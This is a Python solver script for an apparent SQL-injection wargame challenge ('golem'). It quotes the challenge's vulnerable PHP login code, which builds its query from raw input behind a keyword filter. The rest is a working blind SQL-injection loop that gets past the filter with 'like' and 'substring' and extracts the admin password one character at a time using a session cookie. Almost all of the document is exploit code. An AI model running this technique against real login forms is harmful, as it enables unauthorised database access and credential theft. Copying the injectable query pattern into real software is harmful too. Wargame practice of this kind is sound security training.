import requests
import string
import time
"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
"""

url = "https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"
strings = string.printable
password = ""
#payload = {"pw":"' || id like 'admin' && length(pw) like 8#"} # '=' -> 'like'
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
for i in range(8):
    for j in strings:
        payload = {"pw":"' || id like 'admin' && substring(pw,"+str(i+1)+",1) like '"+j+"'#"} #you can use mid() instead of substring()
        cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
        r = requests.get(url,params=payload,cookies=cookie)
        #print(r.text)
        if 'Hello admin' in r.text:
            password += j
            print("found {}".format(password))
            if len(password) == 8:
                payload = {"pw": password}
                r = requests.get(url,params=payload,cookies=cookie)
                if "Clear" in r.text:
                    print("clear")
                else:
                    print("try again")
            break
        time.sleep(0.5)
